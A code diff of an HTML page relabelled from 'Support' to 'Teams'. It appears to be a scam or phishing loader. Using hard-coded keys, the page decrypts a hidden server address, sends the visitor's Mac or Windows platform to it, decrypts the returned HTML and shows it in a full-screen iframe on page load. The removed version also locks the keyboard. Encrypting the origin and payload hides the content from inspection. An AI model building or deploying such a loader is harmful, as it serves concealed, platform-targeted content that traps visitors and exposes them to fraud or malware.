@@ -3,262 +3,64 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Support</title>
-  
-  <!-- FIXED: Correct CryptoJS path -->
+  <title>Teams</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
-  
   <style>
-    html, body { 
-      margin: 0; 
-      height: 100%; 
-      overflow: hidden; 
-      background: #fff; 
-    }
-    #contentiframe { 
-      z-index:9999; 
-      position:fixed; 
-      inset:0; 
-      pointer-events:auto; 
-      overflow:hidden;
-      display: none;
-      width: 100%;
-      height: 100%;
-    }
-    #loading {
-      position: fixed;
-      inset: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #fff;
-      z-index: 10000;
-      flex-direction: column;
-      font-family: Arial, sans-serif;
-    }
-    .spinner {
-      width: 50px;
-      height: 50px;
-      border: 3px solid #f3f3f3;
-      border-top: 3px solid #3498db;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    #loading p {
-      margin-top: 20px;
-      color: #666;
-    }
-    #error-msg {
-      display: none;
-      text-align: center;
-      padding: 20px;
-    }
-    #error-msg .error-icon {
-      font-size: 48px;
-      color: #e74c3c;
-    }
-    #error-msg h3 {
-      color: #333;
-      margin: 10px 0;
-    }
-    #error-msg p {
-      color: #888;
-      margin: 5px 0;
-    }
-    #error-msg button {
-      padding: 10px 30px;
-      margin-top: 20px;
-      cursor: pointer;
-      background: #3498db;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-    }
-    #error-msg button:hover {
-      background: #2980b9;
-    }
+    html, body { margin: 0; height: 100%; overflow: hidden; background: #fff; }
+    #frame { width: 100%; height: 100vh; border: 0; display: block; }
   </style>
 
-  <!-- Google tag (gtag.js) - FIXED: Correct ID -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'G-0LY0HY7L01');
-  </script>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-0LY0HY7L01');
+</script>
+
 </head>
 <body>
 
-  <!-- Loading indicator -->
-  <div id="loading">
-    <div class="spinner"></div>
-    <p>Loading content...</p>
-  </div>
-
-  <!-- Error message (hidden initially) -->
-  <div id="error-msg">
-    <div class="error-icon">⚠️</div>
-    <h3>Failed to Load Content</h3>
-    <p id="error-detail">Please check your connection and try again.</p>
-    <button onclick="location.reload()">Refresh Page</button>
-  </div>
-
-  <div id="contentiframe">
-    <iframe id="frame" src="/ajax-jck.html"
-            allow="fullscreen; autoplay; encrypted-media; picture-in-picture" 
-            allowfullscreen 
-            webkitallowfullscreen 
-            mozallowfullscreen 
-            style="width: 100%; height: 100%; border: 0px;">
-    </iframe>
-  </div>
+  <iframe id="frame" title="encrypted shop" source="/ajax-jck.html" allowfullscreen allow="fullscreen"></iframe>
 
   <script>
-    // FIXED: Correct variable names and encryption
     const PASSPHRASE = "98yNCjeAfWMwk0wI";  
     const URL_KEY = "UrLk3yShopEase01";
     const ENC_DATA_ORIGIN = "U2FsdGVkX19JzfJcbkpx0lIuONyvMQ9gjcZSw7Bx/Bs36JWstdXSf0v9oWVxZd0x8lBsfAIDzu549PjWPlHakQ==";
-    
-    // FIXED: Added try-catch for decryption
-    let DATA_ORIGIN = "";
-    try {
-      DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
-      if (!DATA_ORIGIN) throw new Error("Decryption failed");
-    } catch(e) {
-      console.error("Decryption error:", e);
-      showError("Failed to decrypt data origin");
-    }
-    
-    const DATA_URL = DATA_ORIGIN ? DATA_ORIGIN + "/data" : "";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
     let lastUrl = null;
 
-    function showError(message) {
-      document.getElementById("loading").style.display = "none";
-      const errorDiv = document.getElementById("error-msg");
-      errorDiv.style.display = "block";
-      document.getElementById("error-detail").textContent = message || "Unknown error occurred";
-    }
-
     function detectPlatform() {
-      try {
-        const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
-                  navigator.platform || navigator.userAgent || "";
-        return /mac/i.test(p) ? "mac" : "win";
-      } catch(e) {
-        return "win";
-      }
-    }
-
-    function secureKeyboardAccess() {
-      try {
-        if (navigator.keyboard) {
-          navigator.keyboard.lock().catch((err) =>
-            console.warn("Keyboard lock failed:", err)
-          );
-        }
-      } catch(e) {
-        console.warn("Keyboard lock not supported");
-      }
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
     }
 
     async function loadSecret() {
-      // Check if DATA_URL is valid
-      if (!DATA_URL) {
-        showError("Invalid data configuration");
-        return;
-      }
-
       const frame = document.getElementById("frame");
-      const loading = document.getElementById("loading");
-      const contentDiv = document.getElementById("contentiframe");
-      
       try {
-        // FIXED: Added timeout to fetch
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
         
-        const res = await fetch(DATA_URL + "?platform=" + detectPlatform(), {
-          signal: controller.signal
-        });
-        clearTimeout(timeoutId);
-        
-        if (!res.ok) {
-          throw new Error(`HTTP ${res.status}: ${res.statusText}`);
-        }
-        
-        const data = await res.json();
-        
-        // FIXED: Check if cipher exists
-        if (!data || !data.cipher) {
-          throw new Error("No cipher data received");
-        }
-        
-        const html = CryptoJS.AES.decrypt(data.cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
-        
-        if (!html || html.trim() === "") {
-          throw new Error("Decryption failed or empty content");
-        }
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-        // Clean up old blob URL
-        if (lastUrl) {
-          URL.revokeObjectURL(lastUrl);
-          lastUrl = null;
-        }
-        
-        // Create new blob
-        const blob = new Blob([html], { type: "text/html; charset=utf-8" });
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
         lastUrl = URL.createObjectURL(blob);
 
-        // Show iframe and hide loading
-        contentDiv.style.display = "block";
-        loading.style.display = "none";
-        
-        // Set iframe source
         frame.src = lastUrl;
         
-        // FIXED: Better iframe load handling
-        frame.onload = function() {
-          console.log("✅ Content loaded successfully in iframe");
-          secureKeyboardAccess();
-        };
-        
-        frame.onerror = function(e) {
-          console.error("❌ Iframe load error:", e);
-          showError("Failed to load content in iframe");
-        };
-
       } catch (e) {
-        console.error("❌ Failed to load content:", e);
-        if (e.name === 'AbortError') {
-          showError("Request timed out. Please try again.");
-        } else {
-          showError(e.message || "Unknown error occurred");
-        }
+        console.error("Failed to load or decrypt the content: ", e.message);
       }
     }
 
-    // FIXED: Handle iframe errors properly
-    document.addEventListener("DOMContentLoaded", function() {
-      // Small delay to ensure everything is ready
-      setTimeout(loadSecret, 100);
-    });
-
-    // FIXED: Handle uncaught errors
-    window.addEventListener('error', function(e) {
-      console.error('Global error:', e.message);
-      if (e.message.includes('appendChild') || e.message.includes('concat')) {
-        // These errors are likely from the iframe content, not our code
-        console.warn('Iframe content may have errors:', e.message);
-      }
-    });
-
-    console.log("✅ Application initialized");
+    
+    window.addEventListener("DOMContentLoaded", loadSecret);
   </script>
 </body>
 </html>
